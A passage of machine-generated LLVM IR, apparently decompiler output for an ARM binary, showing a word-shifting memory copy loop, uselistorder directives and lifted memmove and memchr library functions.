  %v4_ffe4 = add i32 %v0_ffe4, -8
  %v5_ffe4 = inttoptr i32 %v4_ffe4 to i32*
  %v6_ffe4 = load i32, i32* %v5_ffe4, align 4
  store i32 %v6_ffe4, i32* %r4.global-to-local, align 4
  %v7_ffe4 = add i32 %v0_ffe4, -12
  %v8_ffe4 = inttoptr i32 %v7_ffe4 to i32*
  %v9_ffe4 = load i32, i32* %v8_ffe4, align 4
  store i32 %v9_ffe4, i32* %r5.global-to-local, align 4
  %v10_ffe4 = add i32 %v0_ffe4, -16
  %v11_ffe4 = inttoptr i32 %v10_ffe4 to i32*
  %v12_ffe4 = load i32, i32* %v11_ffe4, align 4
  store i32 %v10_ffe4, i32* %r1.global-to-local, align 4
  %v4_ffe8 = udiv i32 %v12_ffe4, 65536
  %v5_ffe8 = or i32 %v4_ffe8, %v3_ffe0
  store i32 %v5_ffe8, i32* %lr.global-to-local, align 4
  %v3_ffec = mul i32 %v12_ffe4, 65536
  %v4_fff0 = udiv i32 %v9_ffe4, 65536
  %v5_fff0 = or i32 %v3_ffec, %v4_fff0
  store i32 %v5_fff0, i32* @ip, align 4
  %v3_fff4 = mul i32 %v9_ffe4, 65536
  %v4_fff8 = udiv i32 %v6_ffe4, 65536
  %v5_fff8 = or i32 %v3_fff4, %v4_fff8
  store i32 %v5_fff8, i32* %r5.global-to-local, align 4
  %v3_fffc = mul i32 %v6_ffe4, 65536
  %v4_10000 = udiv i32 %v3_ffe4, 65536
  %v5_10000 = or i32 %v3_fffc, %v4_10000
  store i32 %v5_10000, i32* %r4.global-to-local, align 4
  %v1_10004 = add i32 %v0_10004, -16
  %v2_10004 = inttoptr i32 %v1_10004 to i32*
  store i32 %v5_10000, i32* %v2_10004, align 4
  %v4_10004 = add i32 %v0_10004, -12
  %v5_10004 = inttoptr i32 %v4_10004 to i32*
  %v6_10004 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_10004, i32* %v5_10004, align 4
  %v7_10004 = add i32 %v0_10004, -8
  %v8_10004 = inttoptr i32 %v7_10004 to i32*
  %v9_10004 = load i32, i32* @ip, align 4
  store i32 %v9_10004, i32* %v8_10004, align 4
  %v10_10004 = add i32 %v0_10004, -4
  %v11_10004 = inttoptr i32 %v10_10004 to i32*
  %v12_10004 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_10004, i32* %v11_10004, align 4
  store i32 %v1_10004, i32* %r0.global-to-local, align 4
  %v0_10008 = load i32, i32* %r2.global-to-local, align 4
  %v2_10008 = add i32 %v0_10008, -16
  store i32 %v2_10008, i32* %r2.global-to-local, align 4
  %v6_1000c = icmp slt i32 %v0_10008, 16
  br i1 %v6_1000c, label %dec_label_pc_10010, label %dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge

dec_label_pc_ffe0.dec_label_pc_ffe0_crit_edge:    ; preds = %dec_label_pc_ffe0
  %v0_ffe0.pre = load i32, i32* @r3, align 4
  %v0_ffe4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ffe0

dec_label_pc_10010:                               ; preds = %dec_label_pc_ffe0
  %v2_10010 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10010, i32* @r4, align 4
  %v5_10010 = load i8*, i8** %stack_var_-8, align 4
  %v6_10010 = ptrtoint i8* %v5_10010 to i32
  store i32 %v6_10010, i32* @r5, align 4
  store i32 %v11_ffdc, i32* @lr, align 4
  %v2_10014 = add i32 %v0_10008, -4
  store i32 %v2_10014, i32* %r2.global-to-local, align 4
  %v4_10014 = add i32 %v0_10008, 2147483632
  %v5_10014 = and i32 %v2_10014, %v4_10014
  %v6_10014 = icmp slt i32 %v5_10014, 0
  store i1 %v6_10014, i1* %cpsr_v.global-to-local, align 1
  %v7_10014 = icmp slt i32 %v2_10014, 0
  store i1 %v7_10014, i1* %cpsr_n.global-to-local, align 1
  %v5_10018 = icmp slt i32 %v2_10008, -12
  br i1 %v5_10018, label %dec_label_pc_10034, label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %dec_label_pc_10010, %dec_label_pc_ffd0, %dec_label_pc_1001c
  %v1_10028 = phi i32 [ %v5_10028, %dec_label_pc_1001c ], [ %v1_10004, %dec_label_pc_10010 ], [ %v0_ff9830, %dec_label_pc_ffd0 ]
  %v0_1001c = load i32, i32* @r3, align 4
  %v3_1001c = mul i32 %v0_1001c, 65536
  store i32 %v3_1001c, i32* %ip.global-to-local, align 4
  %v0_10020 = load i32, i32* %r1.global-to-local, align 4
  %v1_10020 = add i32 %v0_10020, -4
  %v2_10020 = inttoptr i32 %v1_10020 to i32*
  %v3_10020 = load i32, i32* %v2_10020, align 4
  store i32 %v3_10020, i32* @r3, align 4
  store i32 %v1_10020, i32* %r1.global-to-local, align 4
  %v4_10024 = udiv i32 %v3_10020, 65536
  %v5_10024 = or i32 %v4_10024, %v3_1001c
  store i32 %v5_10024, i32* @ip, align 4
  %v2_10028 = add i32 %v1_10028, -4
  %v3_10028 = inttoptr i32 %v2_10028 to i32*
  store i32 %v5_10024, i32* %v3_10028, align 4
  %v4_10028 = load i32, i32* %r0.global-to-local, align 4
  %v5_10028 = add i32 %v4_10028, -4
  store i32 %v5_10028, i32* %r0.global-to-local, align 4
  %v0_1002c = load i32, i32* %r2.global-to-local, align 4
  %v2_1002c = add i32 %v0_1002c, -4
  store i32 %v2_1002c, i32* %r2.global-to-local, align 4
  %v6_10030 = icmp slt i32 %v0_1002c, 4
  br i1 %v6_10030, label %dec_label_pc_10034.loopexit, label %dec_label_pc_1001c

dec_label_pc_10034.loopexit:                      ; preds = %dec_label_pc_1001c
  %v4_1002c = sub i32 3, %v0_1002c
  %v5_1002c = and i32 %v4_1002c, %v0_1002c
  %v6_1002c = icmp slt i32 %v5_1002c, 0
  %v7_1002c = icmp slt i32 %v2_1002c, 0
  store i1 %v6_1002c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1002c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_10034

dec_label_pc_10034:                               ; preds = %dec_label_pc_10034.loopexit, %dec_label_pc_10010
  %v2_ff0c63 = phi i32 [ %v5_10028, %dec_label_pc_10034.loopexit ], [ %v1_10004, %dec_label_pc_10010 ]
  %v0_fefc59 = phi i32 [ %v2_1002c, %dec_label_pc_10034.loopexit ], [ %v2_10014, %dec_label_pc_10010 ]
  %v0_10034 = load i32, i32* %r1.global-to-local, align 4
  %v1_10034 = add i32 %v0_10034, 2
  store i32 %v1_10034, i32* @r1, align 4
  br label %bb142

dec_label_pc_1003c:                               ; preds = %dec_label_pc_ff50
  br i1 %v5_10040, label %dec_label_pc_10088, label %dec_label_pc_10044

dec_label_pc_10044:                               ; preds = %dec_label_pc_1003c
  store i32 %v2_1003c, i32* %r2.global-to-local, align 4
  %v3_10048 = load i32, i32* @r4, align 4
  store i32 %v3_10048, i32* %stack_var_-12, align 4
  %v6_10048 = load i32, i32* @r5, align 4
  %v8_10048 = inttoptr i32 %v6_10048 to i8*
  store i8* %v8_10048, i8** %stack_var_-8, align 4
  %v11_10048 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_1004c.dec_label_pc_1004c_crit_edge, %dec_label_pc_10044
  %v0_10070 = phi i32 [ %v1_10070, %dec_label_pc_1004c.dec_label_pc_1004c_crit_edge ], [ %v0_ff9830, %dec_label_pc_10044 ]
  %v0_10050 = phi i32 [ %v0_10050.pre, %dec_label_pc_1004c.dec_label_pc_1004c_crit_edge ], [ %v1_ff50, %dec_label_pc_10044 ]
  %v0_1004c = phi i32 [ %v0_1004c.pre, %dec_label_pc_1004c.dec_label_pc_1004c_crit_edge ], [ %v2_ff54, %dec_label_pc_10044 ]
  %v3_1004c = mul i32 %v0_1004c, 16777216
  store i32 %v3_1004c, i32* %lr.global-to-local, align 4
  %v1_10050 = add i32 %v0_10050, -4
  %v2_10050 = inttoptr i32 %v1_10050 to i32*
  %v3_10050 = load i32, i32* %v2_10050, align 4
  store i32 %v3_10050, i32* @r3, align 4
  %v4_10050 = add i32 %v0_10050, -8
  %v5_10050 = inttoptr i32 %v4_10050 to i32*
  %v6_10050 = load i32, i32* %v5_10050, align 4
  store i32 %v6_10050, i32* %r4.global-to-local, align 4
  %v7_10050 = add i32 %v0_10050, -12
  %v8_10050 = inttoptr i32 %v7_10050 to i32*
  %v9_10050 = load i32, i32* %v8_10050, align 4
  store i32 %v9_10050, i32* %r5.global-to-local, align 4
  %v10_10050 = add i32 %v0_10050, -16
  %v11_10050 = inttoptr i32 %v10_10050 to i32*
  %v12_10050 = load i32, i32* %v11_10050, align 4
  store i32 %v10_10050, i32* %r1.global-to-local, align 4
  %v4_10054 = udiv i32 %v12_10050, 256
  %v5_10054 = or i32 %v4_10054, %v3_1004c
  store i32 %v5_10054, i32* %lr.global-to-local, align 4
  %v3_10058 = mul i32 %v12_10050, 16777216
  %v4_1005c = udiv i32 %v9_10050, 256
  %v5_1005c = or i32 %v3_10058, %v4_1005c
  store i32 %v5_1005c, i32* @ip, align 4
  %v3_10060 = mul i32 %v9_10050, 16777216
  %v4_10064 = udiv i32 %v6_10050, 256
  %v5_10064 = or i32 %v3_10060, %v4_10064
  store i32 %v5_10064, i32* %r5.global-to-local, align 4
  %v3_10068 = mul i32 %v6_10050, 16777216
  %v4_1006c = udiv i32 %v3_10050, 256
  %v5_1006c = or i32 %v3_10068, %v4_1006c
  store i32 %v5_1006c, i32* %r4.global-to-local, align 4
  %v1_10070 = add i32 %v0_10070, -16
  %v2_10070 = inttoptr i32 %v1_10070 to i32*
  store i32 %v5_1006c, i32* %v2_10070, align 4
  %v4_10070 = add i32 %v0_10070, -12
  %v5_10070 = inttoptr i32 %v4_10070 to i32*
  %v6_10070 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_10070, i32* %v5_10070, align 4
  %v7_10070 = add i32 %v0_10070, -8
  %v8_10070 = inttoptr i32 %v7_10070 to i32*
  %v9_10070 = load i32, i32* @ip, align 4
  store i32 %v9_10070, i32* %v8_10070, align 4
  %v10_10070 = add i32 %v0_10070, -4
  %v11_10070 = inttoptr i32 %v10_10070 to i32*
  %v12_10070 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_10070, i32* %v11_10070, align 4
  store i32 %v1_10070, i32* %r0.global-to-local, align 4
  %v0_10074 = load i32, i32* %r2.global-to-local, align 4
  %v2_10074 = add i32 %v0_10074, -16
  store i32 %v2_10074, i32* %r2.global-to-local, align 4
  %v6_10078 = icmp slt i32 %v0_10074, 16
  br i1 %v6_10078, label %dec_label_pc_1007c, label %dec_label_pc_1004c.dec_label_pc_1004c_crit_edge

dec_label_pc_1004c.dec_label_pc_1004c_crit_edge:  ; preds = %dec_label_pc_1004c
  %v0_1004c.pre = load i32, i32* @r3, align 4
  %v0_10050.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1004c

dec_label_pc_1007c:                               ; preds = %dec_label_pc_1004c
  %v2_1007c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1007c, i32* @r4, align 4
  %v5_1007c = load i8*, i8** %stack_var_-8, align 4
  %v6_1007c = ptrtoint i8* %v5_1007c to i32
  store i32 %v6_1007c, i32* @r5, align 4
  store i32 %v11_10048, i32* @lr, align 4
  %v2_10080 = add i32 %v0_10074, -4
  store i32 %v2_10080, i32* %r2.global-to-local, align 4
  %v4_10080 = add i32 %v0_10074, 2147483632
  %v5_10080 = and i32 %v2_10080, %v4_10080
  %v6_10080 = icmp slt i32 %v5_10080, 0
  store i1 %v6_10080, i1* %cpsr_v.global-to-local, align 1
  %v7_10080 = icmp slt i32 %v2_10080, 0
  store i1 %v7_10080, i1* %cpsr_n.global-to-local, align 1
  %v5_10084 = icmp slt i32 %v2_10074, -12
  br i1 %v5_10084, label %dec_label_pc_100a0, label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %dec_label_pc_1007c, %dec_label_pc_1003c, %dec_label_pc_10088
  %v1_10094 = phi i32 [ %v5_10094, %dec_label_pc_10088 ], [ %v1_10070, %dec_label_pc_1007c ], [ %v0_ff9830, %dec_label_pc_1003c ]
  %v0_10088 = load i32, i32* @r3, align 4
  %v3_10088 = mul i32 %v0_10088, 16777216
  store i32 %v3_10088, i32* %ip.global-to-local, align 4
  %v0_1008c = load i32, i32* %r1.global-to-local, align 4
  %v1_1008c = add i32 %v0_1008c, -4
  %v2_1008c = inttoptr i32 %v1_1008c to i32*
  %v3_1008c = load i32, i32* %v2_1008c, align 4
  store i32 %v3_1008c, i32* @r3, align 4
  store i32 %v1_1008c, i32* %r1.global-to-local, align 4
  %v4_10090 = udiv i32 %v3_1008c, 256
  %v5_10090 = or i32 %v4_10090, %v3_10088
  store i32 %v5_10090, i32* @ip, align 4
  %v2_10094 = add i32 %v1_10094, -4
  %v3_10094 = inttoptr i32 %v2_10094 to i32*
  store i32 %v5_10090, i32* %v3_10094, align 4
  %v4_10094 = load i32, i32* %r0.global-to-local, align 4
  %v5_10094 = add i32 %v4_10094, -4
  store i32 %v5_10094, i32* %r0.global-to-local, align 4
  %v0_10098 = load i32, i32* %r2.global-to-local, align 4
  %v2_10098 = add i32 %v0_10098, -4
  store i32 %v2_10098, i32* %r2.global-to-local, align 4
  %v6_1009c = icmp slt i32 %v0_10098, 4
  br i1 %v6_1009c, label %dec_label_pc_100a0.loopexit, label %dec_label_pc_10088

dec_label_pc_100a0.loopexit:                      ; preds = %dec_label_pc_10088
  %v4_10098 = sub i32 3, %v0_10098
  %v5_10098 = and i32 %v4_10098, %v0_10098
  %v6_10098 = icmp slt i32 %v5_10098, 0
  %v7_10098 = icmp slt i32 %v2_10098, 0
  store i1 %v6_10098, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_10098, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_100a0

dec_label_pc_100a0:                               ; preds = %dec_label_pc_100a0.loopexit, %dec_label_pc_1007c
  %v2_ff0c64 = phi i32 [ %v5_10094, %dec_label_pc_100a0.loopexit ], [ %v1_10070, %dec_label_pc_1007c ]
  %v0_fefc60 = phi i32 [ %v2_10098, %dec_label_pc_100a0.loopexit ], [ %v2_10080, %dec_label_pc_1007c ]
  %v0_100a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_100a0 = add i32 %v0_100a0, 1
  store i32 %v1_100a0, i32* @r1, align 4
  br label %bb142

; uselistorder directives
  uselistorder i32 %v5_10094, { 0, 2, 1 }
  uselistorder i32 %v3_10088, { 1, 0 }
  uselistorder i32 %v2_10080, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10070, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_10050, { 1, 0 }
  uselistorder i32 %v3_1004c, { 1, 0 }
  uselistorder i32 %v0_10050, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10070, { 3, 2, 1, 0 }
  uselistorder i32 %v5_10028, { 0, 2, 1 }
  uselistorder i32 %v3_1001c, { 1, 0 }
  uselistorder i32 %v2_10014, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10004, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_ffe4, { 1, 0 }
  uselistorder i32 %v3_ffe0, { 1, 0 }
  uselistorder i32 %v0_ffe4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_10004, { 3, 2, 1, 0 }
  uselistorder i32 %v5_ffbc, { 0, 2, 1 }
  uselistorder i32 %v3_ffb0, { 1, 0 }
  uselistorder i32 %v2_ffa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_ff98, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_ff78, { 1, 0 }
  uselistorder i32 %v3_ff74, { 1, 0 }
  uselistorder i32 %v0_ff78, { 3, 2, 1, 0 }
  uselistorder i32 %v0_ff98, { 3, 2, 1, 0 }
  uselistorder i1 %v5_10040, { 2, 0, 1 }
  uselistorder i32 %v0_ff58, { 1, 0 }
  uselistorder i32 %v0_10044, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ff9830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_ff48, { 2, 1, 0 }
  uselistorder i32 %v0_ff48, { 2, 0, 1 }
  uselistorder i32 %v2_ff40, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_ff40, { 1, 0, 2 }
  uselistorder i32 %v0_ff40, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ff9831, { 2, 1, 0 }
  uselistorder i32 %v11_ff1c, { 1, 0 }
  uselistorder i32 %v7_ff1c, { 1, 0 }
  uselistorder i32 %v1_fefc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_fefc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_ff00, { 1, 0 }
  uselistorder i32 %v7_fef4, { 0, 2, 1 }
  uselistorder i32 %v10_fef0, { 1, 0 }
  uselistorder i32 %v9_fee8, { 1, 0, 2 }
  uselistorder i32 %v6_fee4, { 1, 0 }
  uselistorder i32 %v2_fedc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_fedc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_feec, { 0, 3, 2, 1 }
  uselistorder i32 %v7_fed0, { 0, 2, 1 }
  uselistorder i32 %v13_fecc, { 1, 0 }
  uselistorder i32 %v4_fec8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_fec8, { 2, 0, 1 }
  uselistorder i32 %v6_fed0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_fec0, { 0, 2, 1 }
  uselistorder i32 %v16_febc, { 1, 0 }
  uselistorder i32 %v4_feb8, { 1, 0 }
  uselistorder i32 %v0_fec8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_fec0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_feac, { 0, 3, 2, 1 }
  uselistorder i32 %v10_fea8, { 1, 0 }
  uselistorder i32 %v1_fea4, { 1, 0 }
  uselistorder i32 %v10_fea0, { 1, 0 }
  uselistorder i32 %v0_fea0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_fea4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_fe98, { 0, 2, 1 }
  uselistorder i32 %v2_fe8c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_fe8c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_fea448, { 1, 2, 0 }
  uselistorder i32 %v1_fe84, { 2, 1, 0 }
  uselistorder i32 %v1_fe7c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_fe74, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_fe70, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_fe6c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_fe6c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_fe58, { 0, 2, 1 }
  uselistorder i32 %v3_fe4c, { 1, 0 }
  uselistorder i32 %v2_fe44, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fe34, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fe14, { 1, 0, 2 }
  uselistorder i32 %v5_fe14, { 1, 0, 2 }
  uselistorder i32 %v2_fe14, { 1, 0, 2 }
  uselistorder i32 %v0_fe14, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fe34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_fdec, { 0, 2, 1 }
  uselistorder i32 %v3_fde0, { 1, 0 }
  uselistorder i32 %v2_fdd8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fdc8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fda8, { 1, 0, 2 }
  uselistorder i32 %v5_fda8, { 1, 0, 2 }
  uselistorder i32 %v2_fda8, { 1, 0, 2 }
  uselistorder i32 %v0_fda8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fdc8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_fd80, { 0, 2, 1 }
  uselistorder i32 %v3_fd74, { 1, 0 }
  uselistorder i32 %v2_fd6c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_fd5c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_fd3c, { 1, 0, 2 }
  uselistorder i32 %v5_fd3c, { 1, 0, 2 }
  uselistorder i32 %v2_fd3c, { 1, 0, 2 }
  uselistorder i32 %v0_fd3c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fd5c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_fe04, { 2, 0, 1 }
  uselistorder i32 %v0_fe08, { 3, 0, 2, 1 }
  uselistorder i32 %v0_fd5c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_fd0c, { 1, 0 }
  uselistorder i32 %v0_fd0c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_fd04, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_fd04, { 1, 0, 2 }
  uselistorder i32 %v0_fd04, { 2, 0, 1, 3 }
  uselistorder i32 %v0_fd5c75, { 2, 1, 0 }
  uselistorder i32 %v1_fce4, { 1, 0, 2 }
  uselistorder i32 %v1_fcbc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_fcbc, { 1, 2, 0, 3 }
  uselistorder i32 %v8_fca8, { 1, 0, 2 }
  uselistorder i32 %v6_fca4, { 1, 0 }
  uselistorder i32 %v2_fc9c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_fc9c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_fcac, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_fc94, { 0, 2, 1 }
  uselistorder i1 %v0_fc94, { 1, 0 }
  uselistorder i1 %v1_fc94, { 1, 0 }
  uselistorder i32 %v3_fc90, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_fc88, { 0, 2, 1, 3 }
  uselistorder i32 %v4_fc74, { 1, 0 }
  uselistorder i32 %v12_fc68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fc5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fc60, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_fc50, { 0, 2, 1 }
  uselistorder i32 %v2_fc48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_fc48, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_fc40, { 1, 0 }
  uselistorder i32 %v1_fc38, { 2, 1, 0 }
  uselistorder i32 %v2_fc30, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_fc30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fc20, { 1, 0 }
  uselistorder i32 %v1_fc20, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_fc20, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 41, 0, 42, 1, 24, 2, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 45, 46, 47, 0, 48, 1, 25, 2, 26, 24, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ffb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff50, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb142, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_fedc, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_fea0, { 1, 0 }
  uselistorder label %dec_label_pc_fe8c, { 1, 0 }
  uselistorder label %dec_label_pc_fe4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fde0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fd74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fd14, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb132, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_fc88, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_fc48, { 1, 0 }
}

define i32 @function_100a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100a8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_100b0 = load i32, i32* @r0, align 4
  %v1_100b0 = load i32, i32* @r1, align 4
  %v2_100b0 = inttoptr i32 %v0_100b0 to i8*
  %v3_100b0 = call i32 @_memcpy(i8* %v2_100b0, i32 %v1_100b0)
  ret i32 %v3_100b0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_100c0 = load i32, i32* @r4, align 4
  %v6_100c0 = load i32, i32* @r5, align 4
  %v9_100c0 = load i32, i32* @r6, align 4
  %v1_100c4 = urem i32 %arg1, 256
  %v0_100e018 = load i32, i32* @r2, align 4
  %v2_100e020 = icmp eq i32 %v0_100e018, 0
  br i1 %v2_100e020, label %dec_label_pc_100f0, label %dec_label_pc_100e8

dec_label_pc_100cc:                               ; preds = %dec_label_pc_100e8
  %v3_100cc = load i8, i8* %.021, align 1
  %v4_100cc = zext i8 %v3_100cc to i32
  %v9_100d0 = icmp eq i32 %v4_100cc, %v1_100c4
  %v1_100d4 = add i32 %v0_100d4, -1
  br i1 %v9_100d0, label %bb, label %dec_label_pc_100e0

bb:                                               ; preds = %dec_label_pc_100cc
  ret i32 %v1_100e8

dec_label_pc_100e0:                               ; preds = %dec_label_pc_100cc
  %v2_100dc = add i32 %v1_100e8, 1
  %v3_100dc = inttoptr i32 %v2_100dc to i8*
  %v2_100e0 = icmp eq i32 %v1_100d4, 0
  br i1 %v2_100e0, label %dec_label_pc_100f0, label %dec_label_pc_100e8

dec_label_pc_100e8:                               ; preds = %entry, %dec_label_pc_100e0
  %v0_100d4 = phi i32 [ %v1_100d4, %dec_label_pc_100e0 ], [ %v0_100e018, %entry ]
  %.021 = phi i8* [ %v3_100dc, %dec_label_pc_100e0 ], [ undef, %entry ]
  %v1_100e8 = ptrtoint i8* %.021 to i32
  %v2_100e8 = urem i32 %v1_100e8, 4
  %v3_100e8 = icmp eq i32 %v2_100e8, 0
  br i1 %v3_100e8, label %dec_label_pc_100f0, label %dec_label_pc_100cc

dec_label_pc_100f0:                               ; preds = %dec_label_pc_100e0, %dec_label_pc_100e8, %entry
  %v0_1017c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_100e0 ], [ %v0_100d4, %dec_label_pc_100e8 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_100dc, %dec_label_pc_100e0 ], [ %.021, %dec_label_pc_100e8 ]
  %v4_100f0 = mul nuw nsw i32 %v1_100c4, 256
  %v5_100f0 = or i32 %v4_100f0, %v1_100c4
  %v1_100f4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_100f4, i32* @ip, align 4
